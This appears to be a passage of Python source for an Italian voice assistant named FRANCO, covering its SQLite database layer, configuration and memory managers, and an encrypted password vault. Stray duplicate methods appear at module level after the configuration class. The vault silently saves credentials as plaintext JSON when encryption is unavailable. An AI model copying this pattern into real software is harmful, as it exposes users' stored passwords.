            cur.execute("CREATE INDEX IF NOT EXISTS idx_sec_ts ON security_events(timestamp)")
            
            # Statistics
            cur.execute("""
                CREATE TABLE IF NOT EXISTS statistics (
                    key TEXT PRIMARY KEY,
                    value TEXT NOT NULL,
                    updated DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            """)
            
            # API usage tracking
            cur.execute("""
                CREATE TABLE IF NOT EXISTS api_usage (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    api_name TEXT NOT NULL,
                    endpoint TEXT,
                    tokens_used INTEGER DEFAULT 0,
                    cost REAL DEFAULT 0,
                    success INTEGER,
                    response_time REAL,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            """)
            
            # File operations log
            cur.execute("""
                CREATE TABLE IF NOT EXISTS file_operations (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    operation TEXT NOT NULL,
                    source_path TEXT,
                    destination_path TEXT,
                    size_bytes INTEGER,
                    success INTEGER,
                    error_message TEXT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            """)
            
            # Scheduled tasks
            cur.execute("""
                CREATE TABLE IF NOT EXISTS scheduled_tasks (
                    id TEXT PRIMARY KEY,
                    name TEXT NOT NULL,
                    command TEXT NOT NULL,
                    schedule_type TEXT,
                    next_run DATETIME,
                    last_run DATETIME,
                    interval_seconds INTEGER,
                    enabled INTEGER DEFAULT 1,
                    run_count INTEGER DEFAULT 0,
                    metadata TEXT
                )
            """)

            # Dispositivi controllabili (controllo remoto Android/iOS)
            cur.execute("""
                CREATE TABLE IF NOT EXISTS devices (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    device_name TEXT NOT NULL UNIQUE,
                    owner_name TEXT NOT NULL,
                    platform TEXT NOT NULL CHECK(platform IN ('android','ios')),
                    address TEXT,
                    ios_shortcut_actions TEXT,
                    authorized INTEGER NOT NULL DEFAULT 0,
                    authorized_at DATETIME,
                    created DATETIME DEFAULT CURRENT_TIMESTAMP,
                    last_seen DATETIME
                )
            """)
            cur.execute("""
                CREATE INDEX IF NOT EXISTS idx_devices_owner ON devices(owner_name)
            """)

            # Set schema version
            cur.execute(
                "INSERT OR REPLACE INTO metadata (key, value) VALUES (?, ?)",
                ("schema_version", str(self.SCHEMA_VERSION))
            )
            
            conn.commit()
    
    def execute(self, query: str, params: Tuple = ()) -> sqlite3.Cursor:
        with self._lock:
            conn = self._get_connection()
            cur = conn.cursor()
            cur.execute(query, params)
            conn.commit()
            return cur
    
    def executemany(self, query: str, params_list: List[Tuple]) -> sqlite3.Cursor:
        with self._lock:
            conn = self._get_connection()
            cur = conn.cursor()
            cur.executemany(query, params_list)
            conn.commit()
            return cur
    
    def fetch_one(self, query: str, params: Tuple = ()) -> Optional[Dict]:
        with self._lock:
            conn = self._get_connection()
            cur = conn.cursor()
            cur.execute(query, params)
            row = cur.fetchone()
            return dict(row) if row else None
    
    def fetch_all(self, query: str, params: Tuple = ()) -> List[Dict]:
        with self._lock:
            conn = self._get_connection()
            cur = conn.cursor()
            cur.execute(query, params)
            return [dict(row) for row in cur.fetchall()]
    
    # === CONVERSATION OPS ===
    def add_message(self, conversation_id: str, role: str, content: str,
                   mood: str = "neutro", tokens: int = 0,
                   metadata: Dict = None) -> int:
        cur = self.execute("""
            INSERT INTO conversations 
            (conversation_id, role, content, mood, tokens, metadata)
            VALUES (?, ?, ?, ?, ?, ?)
        """, (conversation_id, role, content, mood, tokens,
              json.dumps(metadata) if metadata else None))
        return cur.lastrowid
    
    def get_conversation(self, conversation_id: str, limit: int = 50) -> List[Dict]:
        return self.fetch_all("""
            SELECT * FROM conversations
            WHERE conversation_id = ?
            ORDER BY timestamp DESC LIMIT ?
        """, (conversation_id, limit))
    
    def search_conversations(self, query: str, limit: int = 30) -> List[Dict]:
        pattern = f"%{query}%"
        return self.fetch_all("""
            SELECT * FROM conversations WHERE content LIKE ?
            ORDER BY timestamp DESC LIMIT ?
        """, (pattern, limit))
    
    # === COMMAND OPS ===
    def log_command(self, command: str, response: str, category: str,
                   success: bool, execution_time: float) -> int:
        cur = self.execute("""
            INSERT INTO commands
            (command, response, category, success, execution_time)
            VALUES (?, ?, ?, ?, ?)
        """, (command, response, category, int(success), execution_time))
        return cur.lastrowid
    
    def get_command_history(self, limit: int = 50,
                           category: str = None) -> List[Dict]:
        if category:
            return self.fetch_all("""
                SELECT * FROM commands WHERE category = ?
                ORDER BY timestamp DESC LIMIT ?
            """, (category, limit))
        return self.fetch_all(
            "SELECT * FROM commands ORDER BY timestamp DESC LIMIT ?",
            (limit,)
        )
    
    # === NOTES OPS ===
    def add_note(self, content: str, title: str = "", category: str = "",
                tags: List[str] = None) -> int:
        cur = self.execute("""
            INSERT INTO notes (title, content, category, tags)
            VALUES (?, ?, ?, ?)
        """, (title, content, category,
              json.dumps(tags) if tags else None))
        return cur.lastrowid
    
    def get_notes(self, category: str = None, limit: int = 50) -> List[Dict]:
        if category:
            return self.fetch_all("""
                SELECT * FROM notes WHERE category = ?
                ORDER BY created DESC LIMIT ?
            """, (category, limit))
        return self.fetch_all(
            "SELECT * FROM notes ORDER BY created DESC LIMIT ?", (limit,)
        )
    
    def search_notes(self, query: str, limit: int = 20) -> List[Dict]:
        pattern = f"%{query}%"
        return self.fetch_all("""
            SELECT * FROM notes 
            WHERE content LIKE ? OR title LIKE ? OR tags LIKE ?
            ORDER BY created DESC LIMIT ?
        """, (pattern, pattern, pattern, limit))
    
    def delete_note(self, note_id: int) -> bool:
        try:
            self.execute("DELETE FROM notes WHERE id = ?", (note_id,))
            return True
        except Exception:
            return False
    
    # === REMINDER OPS ===
    def add_reminder(self, title: str, due_date: datetime,
                    description: str = "", priority: int = 3) -> int:
        cur = self.execute("""
            INSERT INTO reminders (title, description, due_date, priority)
            VALUES (?, ?, ?, ?)
        """, (title, description, due_date.isoformat(), priority))
        return cur.lastrowid
    
    def get_active_reminders(self) -> List[Dict]:
        return self.fetch_all("""
            SELECT * FROM reminders WHERE completed = 0
            ORDER BY due_date ASC
        """)
    
    def get_upcoming_reminders(self, hours: int = 24) -> List[Dict]:
        future = (datetime.now() + timedelta(hours=hours)).isoformat()
        return self.fetch_all("""
            SELECT * FROM reminders
            WHERE completed = 0 AND due_date <= ?
            ORDER BY due_date ASC
        """, (future,))
    
    def complete_reminder(self, reminder_id: int) -> bool:
        try:
            self.execute("""
                UPDATE reminders 
                SET completed = 1, completed_at = CURRENT_TIMESTAMP
                WHERE id = ?
            """, (reminder_id,))
            return True
        except Exception:
            return False
    
    # === CONTACT OPS ===
    def add_contact(self, name: str, email: str = "", phone: str = "",
                   address: str = "", company: str = "", notes: str = "") -> int:
        cur = self.execute("""
            INSERT OR REPLACE INTO contacts 
            (name, email, phone, address, company, notes, updated)
            VALUES (?, ?, ?, ?, ?, ?, CURRENT_TIMESTAMP)
        """, (name, email, phone, address, company, notes))
        return cur.lastrowid
    
    def get_contact(self, name: str) -> Optional[Dict]:
        pattern = f"%{name}%"
        return self.fetch_one(
            "SELECT * FROM contacts WHERE name LIKE ? LIMIT 1", (pattern,)
        )
    
    def get_all_contacts(self) -> List[Dict]:
        return self.fetch_all("SELECT * FROM contacts ORDER BY name")
    
    def delete_contact(self, name: str) -> bool:
        try:
            self.execute("DELETE FROM contacts WHERE name = ?", (name,))
            return True
        except Exception:
            return False

    # === DEVICE OPS (controllo remoto dispositivi) ===
    def add_device(self, device_name: str, owner_name: str, platform: str,
                    address: str = "", ios_shortcut_actions: str = "") -> Optional[int]:
        try:
            cur = self.execute("""
                INSERT INTO devices (device_name, owner_name, platform, address, ios_shortcut_actions)
                VALUES (?, ?, ?, ?, ?)
            """, (device_name, owner_name, platform, address, ios_shortcut_actions))
            return cur.lastrowid
        except Exception:
            return None

    def get_device(self, device_name: str) -> Optional[Dict]:
        pattern = f"%{device_name}%"
        return self.fetch_one(
            "SELECT * FROM devices WHERE device_name LIKE ? LIMIT 1", (pattern,)
        )

    def get_all_devices(self) -> List[Dict]:
        return self.fetch_all("SELECT * FROM devices ORDER BY device_name")

    def delete_device(self, device_name: str) -> bool:
        try:
            self.execute("DELETE FROM devices WHERE device_name = ?", (device_name,))
            return True
        except Exception:
            return False

    def set_device_authorized(self, device_name: str, value: bool) -> bool:
        try:
            self.execute("""
                UPDATE devices SET authorized = ?,
                    authorized_at = CASE WHEN ? THEN CURRENT_TIMESTAMP ELSE authorized_at END
                WHERE device_name = ?
            """, (1 if value else 0, 1 if value else 0, device_name))
            return True
        except Exception:
            return False

    def touch_device_seen(self, device_name: str) -> None:
        try:
            self.execute("UPDATE devices SET last_seen = CURRENT_TIMESTAMP WHERE device_name = ?",
                          (device_name,))
        except Exception:
            pass

    # === SECURITY EVENTS ===
    def log_security_event(self, event_type: str, severity: str,
                          source: str = "", description: str = "",
                          metadata: Dict = None) -> int:
        cur = self.execute("""
            INSERT INTO security_events
            (event_type, severity, source, description, metadata)
            VALUES (?, ?, ?, ?, ?)
        """, (event_type, severity, source, description,
              json.dumps(metadata) if metadata else None))
        return cur.lastrowid
    
    def get_security_events(self, severity: str = None,
                           limit: int = 50) -> List[Dict]:
        if severity:
            return self.fetch_all("""
                SELECT * FROM security_events WHERE severity = ?
                ORDER BY timestamp DESC LIMIT ?
            """, (severity, limit))
        return self.fetch_all("""
            SELECT * FROM security_events
            ORDER BY timestamp DESC LIMIT ?
        """, (limit,))
    
    # === NETWORK SCAN OPS ===
    def save_scan(self, scan_type: str, target: str,
                 results: Any, duration: float = 0) -> int:
        cur = self.execute("""
            INSERT INTO network_scans (scan_type, target, results, duration)
            VALUES (?, ?, ?, ?)
        """, (scan_type, target, json.dumps(results, default=str), duration))
        return cur.lastrowid
    
    def get_scans(self, target: str = None, limit: int = 20) -> List[Dict]:
        if target:
            return self.fetch_all("""
                SELECT * FROM network_scans WHERE target = ?
                ORDER BY timestamp DESC LIMIT ?
            """, (target, limit))
        return self.fetch_all(
            "SELECT * FROM network_scans ORDER BY timestamp DESC LIMIT ?",
            (limit,)
        )
    
    # === STATISTICS ===
    def set_stat(self, key: str, value: Any):
        self.execute("""
            INSERT OR REPLACE INTO statistics (key, value, updated)
            VALUES (?, ?, CURRENT_TIMESTAMP)
        """, (key, json.dumps(value, default=str)))
    
    def get_stat(self, key: str, default: Any = None) -> Any:
        row = self.fetch_one("SELECT value FROM statistics WHERE key = ?", (key,))
        if row:
            try:
                return json.loads(row["value"])
            except Exception:
                return row["value"]
        return default
    
    def increment_stat(self, key: str, amount: int = 1) -> int:
        current = self.get_stat(key, 0)
        new_value = (current if isinstance(current, (int, float)) else 0) + amount
        self.set_stat(key, new_value)
        return new_value
    
    # === API USAGE ===
    def log_api_usage(self, api_name: str, endpoint: str,
                     tokens_used: int = 0, cost: float = 0,
                     success: bool = True, response_time: float = 0) -> int:
        cur = self.execute("""
            INSERT INTO api_usage 
            (api_name, endpoint, tokens_used, cost, success, response_time)
            VALUES (?, ?, ?, ?, ?, ?)
        """, (api_name, endpoint, tokens_used, cost,
              int(success), response_time))
        return cur.lastrowid
    
    def get_api_stats(self, api_name: str = None) -> Dict:
        if api_name:
            row = self.fetch_one("""
                SELECT 
                    COUNT(*) as total_calls,
                    SUM(tokens_used) as total_tokens,
                    SUM(cost) as total_cost,
                    AVG(response_time) as avg_response_time,
                    SUM(success) as successful_calls
                FROM api_usage WHERE api_name = ?
            """, (api_name,))
        else:
            row = self.fetch_one("""
                SELECT 
                    COUNT(*) as total_calls,
                    SUM(tokens_used) as total_tokens,
                    SUM(cost) as total_cost,
                    AVG(response_time) as avg_response_time,
                    SUM(success) as successful_calls
                FROM api_usage
            """)
        return row or {}
    
    # === UTILITY ===
    def backup(self, backup_path: str) -> bool:
        try:
            with self._lock:
                conn = self._get_connection()
                backup_conn = sqlite3.connect(backup_path)
                conn.backup(backup_conn)
                backup_conn.close()
            return True
        except Exception as e:
            print(f"[DB] Backup failed: {e}")
            return False
    
    def vacuum(self):
        """Reclaim space and optimize database"""
        with self._lock:
            conn = self._get_connection()
            conn.execute("VACUUM")
            conn.execute("ANALYZE")
    
    def get_database_info(self) -> Dict:
        size_bytes = self.db_path.stat().st_size if self.db_path.exists() else 0
        tables = self.fetch_all(
            "SELECT name FROM sqlite_master WHERE type='table'"
        )
        return {
            "path": str(self.db_path),
            "size_bytes": size_bytes,
            "size_mb": round(size_bytes / 1024 / 1024, 2),
            "tables": [t["name"] for t in tables],
            "schema_version": self.SCHEMA_VERSION,
        }
    
    def close(self):
        if hasattr(self._local, 'conn'):
            self._local.conn.close()


# ==============================================================================
# CONFIGURATION MANAGER
# ==============================================================================

class ConfigurationManager:
    """
    Gestore configurazione JSON con dot-notation, hot-reload e observer pattern.
    """

    DEFAULT_CONFIG = {
        "system": {
            "name": "FRANCO",
            "version": __version__,
            "language": "it-IT",
            "timezone": "Europe/Rome",
            "auto_save_interval": 60,
        },
        "voice": {
            "enabled": True,
            "voice": "diego",
            "rate": "+5%",
            "pitch": "-2Hz",
            "volume": 0.9,
            "wake_words": WAKE_WORDS,
            "interrupt_on_speech": True,
        },
        "ai": {
            "model": "claude-sonnet-4-5",
            "max_tokens": 2000,
            "temperature": 1.0,
            "context_window": 12,
            "vision_enabled": True,
        },
        "ui": {
            "theme": "nexus",
            "fps": 60,
            "particle_count": 80,
            "window_width": UI_WIDTH,
            "window_height": UI_HEIGHT,
            "show_waveform": True,
            "show_system_stats": True,
        },
        "security": {
            "session_timeout": 3600,
            "max_login_attempts": 5,
            "password_min_length": 8,
            "enable_encryption": True,
            "log_security_events": True,
        },
        "network": {
            "timeout": 10,
            "max_retries": 3,
            "user_agent": USER_AGENT,
            "proxy": None,
            "verify_ssl": True,
        },
        "automation": {
            "enable_macros": True,
            "max_macro_duration": 300,
            "enable_workflows": True,
            "enable_scheduler": True,
            "task_check_interval": 60,
            "max_concurrent_tasks": 5,
        },
        "logging": {
            "level": "INFO",
            "max_file_size": 10485760,
            "backup_count": 5,
            "console_output": True,
            "json_output": False,
        },
        "cybersecurity": {
            "enable_port_scan": True,
            "max_scan_threads": 50,
            "scan_timeout": 1.0,
            "enable_traffic_monitor": False,
            "log_to_security_log": True,
        },
    }

    def __init__(self, config_path: Path = CONFIG_FILE):
        self.config_path = Path(config_path)
        self._config: Dict = copy.deepcopy(self.DEFAULT_CONFIG)
        self._lock = threading.RLock()
        self._observers: List[Callable] = []
        self._last_modified: float = 0
        self._load_or_create()

    def _load_or_create(self):
        if self.config_path.exists():
            self._load()
        else:
            self._config = copy.deepcopy(self.DEFAULT_CONFIG)
            self._save()

    def _load(self):
        try:
            with self._lock:
                with open(self.config_path, "r", encoding="utf-8-sig") as f:
                    modified = os.fstat(f.fileno()).st_mtime_ns
                    loaded = json.load(f)
                if not isinstance(loaded, dict):
                    raise ValueError("La configurazione deve essere un oggetto JSON")
                for section, default in self.DEFAULT_CONFIG.items():
                    if isinstance(default, dict) and section in loaded and not isinstance(loaded[section], dict):
                        raise ValueError(f"La sezione {section} deve essere un oggetto JSON")
                self._config = merge_dicts(copy.deepcopy(self.DEFAULT_CONFIG), loaded)
                self._last_modified = modified
            return True
        except (OSError, ValueError, TypeError) as e:
            print(f"[CONFIG] Ricaricamento fallito: {e}; mantengo la configurazione attiva")
            return False

    def _save(self):
        try:
            self.config_path.parent.mkdir(parents=True, exist_ok=True)
            with self._lock:
                config_copy = copy.deepcopy(self._config)
                with atomic_write(str(self.config_path)) as f:
                    json.dump(config_copy, f, indent=2, ensure_ascii=False, default=str)
                self._last_modified = self.config_path.stat().st_mtime_ns
            return True
        except Exception as e:
            print(f"[CONFIG] Save error: {e}")
            return False

    def get(self, key: str, default: Any = None) -> Any:
        """Get config value using dot notation (es. 'voice.volume')"""
        with self._lock:
            keys = key.split(".")
            current = self._config
            for k in keys:
                if isinstance(current, dict) and k in current:
                    current = current[k]
                else:
                    return default
            return copy.deepcopy(current)

    def set(self, key: str, value: Any, save: bool = True):
        """Set config value using dot notation; reject ambiguous empty paths."""
        if not isinstance(key, str) or not key or any(not part for part in key.split(".")):
            raise ValueError("La chiave deve contenere segmenti non vuoti")
        with self._lock:
            keys = key.split(".")
            current = self._config
            for k in keys[:-1]:
                if k not in current or not isinstance(current[k], dict):
                    current[k] = {}
                current = current[k]
            old_value = current.get(keys[-1])
            current[keys[-1]] = copy.deepcopy(value)
            if save:
                self._save()
            observers = list(self._observers)
        if old_value != value:
            for observer in observers:
                try:
                    observer(key, copy.deepcopy(old_value), copy.deepcopy(value))
                except Exception as _e:
                    pass  # suppressed error

    def reload(self) -> bool:
        """Hot-reload config from disk if modified"""
        with self._lock:
            try:
                current_mtime = self.config_path.stat().st_mtime_ns
            except OSError:
                return False
            if current_mtime != self._last_modified:
                return self._load()
            return False

    def reset_to_defaults(self):
        with self._lock:
            self._config = copy.deepcopy(self.DEFAULT_CONFIG)
            self._save()

    def export(self, path: str) -> bool:
        try:
            with self._lock:
                config_copy = copy.deepcopy(self._config)
            with open(path, "w", encoding="utf-8") as f:
                json.dump(config_copy, f, indent=2, ensure_ascii=False, default=str)
            return True
        except Exception:
            return False

    def add_observer(self, callback: Callable):
        with self._lock:
            self._observers.append(callback)

    def get_all(self) -> Dict:
        with self._lock:
            return copy.deepcopy(self._config)


print("[✓] ConfigurationManager (patched) loaded")
pass
    
def reload(self) -> bool:
        """Hot-reload config from disk if modified"""
        if not self.config_path.exists():
            return False
        
        current_mtime = self.config_path.stat().st_mtime
        if current_mtime > self._last_modified:
            self._load()
            return True
        return False
    
def reset_to_defaults(self):
        with self._lock:
            self._config = copy.deepcopy(self.DEFAULT_CONFIG)
            self._save()
    
def export(self, path: str) -> bool:
        try:
            with self._lock:
                config_copy = copy.deepcopy(self._config)
            with open(path, "w", encoding="utf-8") as f:
                json.dump(config_copy, f, indent=2, ensure_ascii=False, default=str)
            return True
        except Exception:
            return False
    
def add_observer(self, callback: Callable):
        with self._lock:
            self._observers.append(callback)
    
def get_all(self) -> Dict:
        with self._lock:
            return copy.deepcopy(self._config)


# ==============================================================================
# MEMORY MANAGER (Long-term JSON-based memory)
# ==============================================================================

class MemoryManager:
    """
    Gestore memoria persistente per:
    - Profilo utente e preferenze
    - Storico conversazioni breve termine
    - Note rapide
    - Statistiche d'uso
    - Backup automatico incrementale
    """
    
    DEFAULT_MEMORY = {
        "nome_utente": "Signore",
        "preferenze": {
            "tema": "nexus",
            "voce": "diego",
            "velocita_tts": "+5%",
            "lingua": "it-IT",
            "saluto_personalizzato": "",
        },
        "storico": [],
        "storico_lungo": [],
        "note": [],
        "promemoria": [],
        "progetti_python": [],
        "comandi_custom": {},
        "contatti": {},
        "preferiti": [],
        "macros": {},
        "backup_paths": [],
        "mood_history": [],
        "statistiche": {
            "comandi_totali": 0,
            "sessioni": 0,
            "ore_utilizzo": 0,
            "comandi_per_categoria": {},
            "primo_avvio": "",
            "ultimo_avvio": "",
        },
        "sicurezza": {
            "ip_pubblico_storico": [],
            "scansioni_eseguite": 0,
            "minacce_rilevate": 0,
        },
    }
    
    def __init__(self, memory_path: Path = MEMORY_FILE):
        self.memory_path = memory_path
        self._memory: Dict = {}
        self._lock = threading.RLock()
        self._dirty = False
        self._auto_save_thread = None
        self._running = True
        
        self._load_or_create()
        self._start_auto_save()
    
    def _load_or_create(self):
        if self.memory_path.exists():
            try:
                with open(self.memory_path, "r", encoding="utf-8") as f:
                    data = json.load(f)
                
                # Merge with defaults
                self._memory = merge_dicts(self.DEFAULT_MEMORY, data)
            except Exception as e:
                print(f"[MEMORIA] Load error: {e}, using defaults")
                self._memory = copy.deepcopy(self.DEFAULT_MEMORY)
        else:
            self._memory = copy.deepcopy(self.DEFAULT_MEMORY)
            self._memory["statistiche"]["primo_avvio"] = datetime.now().isoformat()
        
        # Update session info
        self._memory["statistiche"]["sessioni"] = \
            self._memory["statistiche"].get("sessioni", 0) + 1
        self._memory["statistiche"]["ultimo_avvio"] = datetime.now().isoformat()
        self._save()
    
    def _save(self):
        try:
            self.memory_path.parent.mkdir(parents=True, exist_ok=True)
            with self._lock:
                # Truncate storico per mantenere file gestibile
                if len(self._memory.get("storico", [])) > 50:
                    self._memory["storico"] = self._memory["storico"][-50:]
                
                data_copy = copy.deepcopy(self._memory)
            
            with atomic_write(str(self.memory_path)) as f:
                json.dump(data_copy, f, ensure_ascii=False, indent=2, default=str)
            
            self._dirty = False
        except Exception as e:
            print(f"[MEMORIA] Save error: {e}")
    
    def _start_auto_save(self):
        def auto_save_loop():
            while self._running:
                time.sleep(60)
                if self._dirty:
                    self._save()
        
        self._auto_save_thread = threading.Thread(
            target=auto_save_loop, daemon=True, name="MemoryAutoSave"
        )
        self._auto_save_thread.start()
    
    def get(self, key: str, default: Any = None) -> Any:
        with self._lock:
            keys = key.split(".")
            current = self._memory
            for k in keys:
                if isinstance(current, dict) and k in current:
                    current = current[k]
                else:
                    return default
            return current
    
    def set(self, key: str, value: Any, save: bool = False):
        with self._lock:
            keys = key.split(".")
            current = self._memory
            for k in keys[:-1]:
                if k not in current or not isinstance(current[k], dict):
                    current[k] = {}
                current = current[k]
            current[keys[-1]] = value
            self._dirty = True
        
        if save:
            self._save()
    
    def append(self, key: str, value: Any, save: bool = False):
        """Append to a list in memory"""
        with self._lock:
            lst = self.get(key, [])
            if not isinstance(lst, list):
                lst = []
            lst.append(value)
            self.set(key, lst, save=False)
        
        if save:
            self._save()
    
    def add_to_history(self, user_msg: str, assistant_msg: str,
                      mood: str = "neutro"):
        entry = {
            "u": user_msg,
            "a": assistant_msg,
            "mood": mood,
            "ts": datetime.now().isoformat(),
        }
        self.append("storico", entry)
    
    def add_note(self, content: str, category: str = "generale") -> int:
        notes = self.get("note", [])
        note = {
            "id": len(notes) + 1,
            "testo": content,
            "categoria": category,
            "ts": datetime.now().isoformat(),
        }
        self.append("note", note, save=True)
        return note["id"]
    
    def add_reminder(self, content: str, due_iso: str = None) -> int:
        reminders = self.get("promemoria", [])
        reminder = {
            "id": len(reminders) + 1,
            "testo": content,
            "scadenza": due_iso,
            "ts": datetime.now().isoformat(),
        }
        self.append("promemoria", reminder, save=True)
        return reminder["id"]
    
    def increment_stat(self, key: str, amount: int = 1):
        with self._lock:
            stats = self._memory.setdefault("statistiche", {})
            stats[key] = stats.get(key, 0) + amount
            self._dirty = True
    
    def update_category_stat(self, category: str):
        with self._lock:
            stats = self._memory.setdefault("statistiche", {})
            per_cat = stats.setdefault("comandi_per_categoria", {})
            per_cat[category] = per_cat.get(category, 0) + 1
            self._dirty = True
    
    def get_recent_history(self, n: int = 10) -> List[Dict]:
        with self._lock:
            return list(self._memory.get("storico", []))[-n:]
    
    def get_user_name(self) -> str:
        return self.get("nome_utente", "Signore")
    
    def set_user_name(self, name: str):
        self.set("nome_utente", name, save=True)
    
    def force_save(self):
        self._save()
    
    def shutdown(self):
        self._running = False
        self._save()
    
    def get_all(self) -> Dict:
        with self._lock:
            return copy.deepcopy(self._memory)
      


# ==============================================================================
# CRYPTO VAULT — Password Manager Crittografato
# ==============================================================================

class CryptoVault:
    """
    Vault crittografato per credenziali con:
    - Crittografia AES-256 via Fernet
    - Master password (PBKDF2)
    - Salt randomico
    - Auto-lock dopo inattività
    - Audit log
    """
    
    def __init__(self, vault_path: Path = VAULT_FILE,
                 key_path: Path = VAULT_KEY_FILE):
        self.vault_path = vault_path
        self.key_path = key_path
        self._vault: Dict = {}
        self._fernet: Optional[Fernet] = None
        self._lock = threading.RLock()
        self._locked = True
        self._last_access = 0
        self._auto_lock_seconds = 300
        self._master_password: Optional[str] = None
        
        self.vault_path.parent.mkdir(parents=True, exist_ok=True)
    
    def _derive_key(self, password: str, salt: bytes) -> bytes:
        """Derive encryption key from master password using PBKDF2"""
        if not DEPENDENCIES_STATUS.get('cryptography'):
            raise FrancoException(
                "cryptography library required", "DEPENDENCY_MISSING"
            )
        
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=PASSWORD_HASH_ITERATIONS,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key
    
    def initialize(self, master_password: str) -> bool:
        """Initialize vault with master password"""
        if not DEPENDENCIES_STATUS.get('cryptography'):
            # Fallback: vault non crittografato
            self._fernet = None
            self._vault = {}
            self._locked = False
            self._save_unencrypted()
            return True
        
        try:
            salt = os.urandom(16)
            key = self._derive_key(master_password, salt)
            
            # Save salt
            with open(self.key_path, "wb") as f:
                f.write(salt)
            
            self._fernet = Fernet(key)
            self._master_password = master_password
            self._vault = {}
            self._locked = False
            self._last_access = time.time()
            self._save()
            return True
        except Exception as e:
            print(f"[VAULT] Init error: {e}")
            return False
    
    def unlock(self, master_password: str) -> bool:
        """Unlock vault with master password"""
        if not self.vault_path.exists():
            return self.initialize(master_password)
        
        if not DEPENDENCIES_STATUS.get('cryptography'):
            return self._load_unencrypted()
        
        try:
            if not self.key_path.exists():
                return False
            
            with open(self.key_path, "rb") as f:
                salt = f.read()
            
            key = self._derive_key(master_password, salt)
            self._fernet = Fernet(key)
            
            # Try to decrypt vault
            with open(self.vault_path, "rb") as f:
                encrypted = f.read()
            
            decrypted = self._fernet.decrypt(encrypted)
            self._vault = json.loads(decrypted.decode())
            self._locked = False
            self._master_password = master_password
            self._last_access = time.time()
            return True
        except Exception as e:
            print(f"[VAULT] Unlock failed: {e}")
            self._fernet = None
            return False
    
    def lock(self):
        """Lock vault and clear sensitive data from memory"""
        with self._lock:
            self._vault = {}
            self._fernet = None
            self._master_password = None
            self._locked = True
    
    def is_locked(self) -> bool:
        with self._lock:
            # Auto-lock se inattivo
            if not self._locked and self._auto_lock_seconds > 0:
                if time.time() - self._last_access > self._auto_lock_seconds:
                    self.lock()
                    return True
            return self._locked
    
    def _check_unlocked(self):
        if self.is_locked():
            raise SecurityError("Vault is locked")
        self._last_access = time.time()
    
    def _save(self):
        if self._fernet is None:
            self._save_unencrypted()
            return
        
        try:
            with self._lock:
                data = json.dumps(self._vault, ensure_ascii=False, default=str)
                encrypted = self._fernet.encrypt(data.encode())
                with open(self.vault_path, "wb") as f:
                    f.write(encrypted)
        except Exception as e:
            print(f"[VAULT] Save error: {e}")
    
    def _save_unencrypted(self):
        """Fallback save without encryption"""
        try:
            path = self.vault_path.with_suffix(".json")
            with open(path, "w", encoding="utf-8") as f:
                json.dump(self._vault, f, ensure_ascii=False, indent=2)
        except Exception as _e:
            pass  # suppressed error
    
    def _load_unencrypted(self) -> bool:
        try:
            path = self.vault_path.with_suffix(".json")
            if path.exists():
                with open(path, "r", encoding="utf-8") as f:
                    self._vault = json.load(f)
                self._locked = False
                return True
        except Exception as _e:
            pass  # suppressed error
        return False
    
    def add(self, service: str, username: str, password: str,
           url: str = "", notes: str = "") -> bool:
        """Add credentials to vault"""
        self._check_unlocked()
        
        with self._lock:
            self._vault[service.lower()] = {
                "service": service,
                "username": username,
                "password": password,
                "url": url,
                "notes": notes,
                "created": datetime.now().isoformat(),
                "modified": datetime.now().isoformat(),
            }
            self._save()
        return True
    
    def get(self, service: str) -> Optional[Dict]:
        """Get credentials for service"""
        self._check_unlocked()
        with self._lock:
            return self._vault.get(service.lower())
    
    def get_credentials_string(self, service: str) -> str:
        """Get human-readable credentials"""
        entry = self.get(service)
        if not entry:
            return f"Nessuna credenziale trovata per '{service}'."
        return (f"Servizio: {entry['service']} — "
                f"Utente: {entry['username']} — "
                f"Password: {entry['password']}")
    
    def update(self, service: str, **fields) -> bool:
        """Update fields of existing entry"""
        self._check_unlocked()
        with self._lock:
            if service.lower() not in self._vault:
                return False
            
            entry = self._vault[service.lower()]
            for key, value in fields.items():
                if key in ["username", "password", "url", "notes"]:
                    entry[key] = value
            entry["modified"] = datetime.now().isoformat()
            self._save()
        return True
    
    def delete(self, service: str) -> bool:
        """Delete credentials"""
        self._check_unlocked()
        with self._lock:
            if service.lower() in self._vault:
                del self._vault[service.lower()]
                self._save()
                return True
        return False
    
    def list_services(self) -> List[str]:
        """List all stored services"""
        self._check_unlocked()
        with self._lock:
            return [entry["service"] for entry in self._vault.values()]
    
    def search(self, query: str) -> List[Dict]:
        """Search services by name"""
        self._check_unlocked()
        query_lower = query.lower()
        with self._lock:
            results = []
            for entry in self._vault.values():
                if (query_lower in entry["service"].lower() or
                    query_lower in entry.get("username", "").lower() or
                    query_lower in entry.get("url", "").lower()):
                    # Don't include password in search results
                    results.append({
                        "service": entry["service"],
                        "username": entry["username"],
                        "url": entry.get("url", ""),
                    })
            return results
    
    def export_encrypted(self, output_path: str, export_password: str) -> bool:
        """Export vault encrypted with different password"""
        self._check_unlocked()
        
        if not DEPENDENCIES_STATUS.get('cryptography'):
            return False
        
        try:
            salt = os.urandom(16)
            key = self._derive_key(export_password, salt)
            fernet = Fernet(key)
            
            with self._lock:
                data = json.dumps(self._vault, ensure_ascii=False, default=str)
            
            encrypted = fernet.encrypt(data.encode())
            
            # Combine salt + encrypted data
            with open(output_path, "wb") as f:
                f.write(salt)
                f.write(b"\n---DATA---\n")
                f.write(encrypted)
            return True
        except Exception as e:
            print(f"[VAULT] Export error: {e}")
            return False
    
    def get_statistics(self) -> Dict:
        with self._lock:
            return {
                "locked": self._locked,
                "entries": len(self._vault),
                "encrypted": self._fernet is not None,
                "last_access": datetime.fromtimestamp(self._last_access).isoformat()
                              if self._last_access else "never",
            }
    
    def change_master_password(self, old_password: str, new_password: str) -> bool:
        """Change the master password"""
        if not self.unlock(old_password):
            return False
        
        try:
            # Save current vault data
            current_data = copy.deepcopy(self._vault)
            
            # Re-initialize with new password
            salt = os.urandom(16)
            key = self._derive_key(new_password, salt)
            
            with open(self.key_path, "wb") as f:
                f.write(salt)
            
            self._fernet = Fernet(key)
            self._master_password = new_password
            self._vault = current_data
            self._save()
            return True
        except Exception as e:
